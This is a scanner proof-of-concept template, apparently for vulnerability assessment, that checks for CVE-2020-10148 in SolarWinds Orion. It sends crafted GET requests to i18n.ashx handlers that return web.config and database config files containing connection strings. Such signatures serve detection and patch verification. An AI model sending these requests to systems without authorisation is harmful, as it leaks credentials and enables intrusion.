name: poc-yaml-solarwinds-cve-2020-10148
binding: 439c81f0-9b7a-4baf-a3ed-c648106e06e9
manual: false
detail:
    author: Monday
    links:
        - https://kb.cert.org/vuls/id/843464
        - https://github.com/jaeles-project/jaeles-signatures/blob/master/cves/solarwinds-lfi-cve-2020-10148.yaml
        - https://nvd.nist.gov/vuln/detail/cve-2020-10148
    vulnerability:
        id: CT-147482
        level: critical
        cve: cve-2020-10148
    description: |
        SolarWinds Orion API is vulnerable to an authentication bypass vulnerability that could allow a remote attacker to execute API commands. This vulnerability could allow a remote attacker to bypass authentication and execute API commands which may result in a compromise of the SolarWinds instance. SolarWinds Orion Platform versions 2019.4 HF 5, 2020.2 with no hotfix installed, and 2020.2 HF 1 are affected.
transport: http
set:
    rstr: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /web.config.i18n.ashx?l={{rstr}}&v={{rstr}}
            follow_redirects: false
        expression: (response.body.bcontains(b"SolarWinds.Orion.Core.") || response.body.bcontains(b"Connection String")) && response.raw_header.bcontains(b"text/plain") && response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /SWNetPerfMon.db.i18n.ashx?l={{rstr}}&v={{rstr}}
            follow_redirects: false
        expression: (response.body.bcontains(b"SolarWinds.Orion.Core.") || response.body.bcontains(b"Connection String")) && response.raw_header.bcontains(b"text/plain") && response.status == 200
expression: r0() || r1()
